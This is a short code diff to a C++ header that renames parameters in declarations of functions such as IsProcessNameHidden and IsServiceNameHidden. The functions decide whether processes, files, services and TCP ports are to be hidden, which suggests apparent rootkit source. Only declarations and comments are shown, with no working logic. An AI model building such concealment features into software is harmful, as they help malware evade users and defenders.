@@ -30,21 +30,21 @@ public:
 	/// <summary>
 	/// Determines whether a process should be hidden based on a specific name.
 	/// </summary>
-	/// <param name="processName">The process name to check.</param>
+	/// <param name="name">The process name to check.</param>
 	/// <returns>
 	/// true, if the process with the specified name should be hidden;
 	/// otherwise, false.
 	/// </returns>
-	static bool IsProcessNameHidden(LPCWSTR processName);
+	static bool IsProcessNameHidden(LPCWSTR name);
 	/// <summary>
 	/// Determines whether a process should be hidden based on a specific name.
 	/// </summary>
-	/// <param name="processName">The process name to check.</param>
+	/// <param name="name">The process name to check.</param>
 	/// <returns>
 	/// true, if the process with the specified name should be hidden;
 	/// otherwise, false.
 	/// </returns>
-	static bool IsProcessNameHidden(UNICODE_STRING processName);
+	static bool IsProcessNameHidden(UNICODE_STRING name);
 	/// <summary>
 	/// Determines whether a file or directory should be hidden based on its full path.
 	/// </summary>
@@ -57,12 +57,12 @@ public:
 	/// <summary>
 	/// Determines whether a service should be hidden based on a specific name.
 	/// </summary>
-	/// <param name="serviceName">The service name to check.</param>
+	/// <param name="name">The service name to check.</param>
 	/// <returns>
 	/// true, if the service with the specified name should be hidden;
 	/// otherwise, false.
 	/// </returns>
-	static bool IsServiceNameHidden(LPCWSTR serviceName);
+	static bool IsServiceNameHidden(LPCWSTR name);
 	/// <summary>
 	/// Determines whether a local TCP port should be hidden.
 	/// </summary>
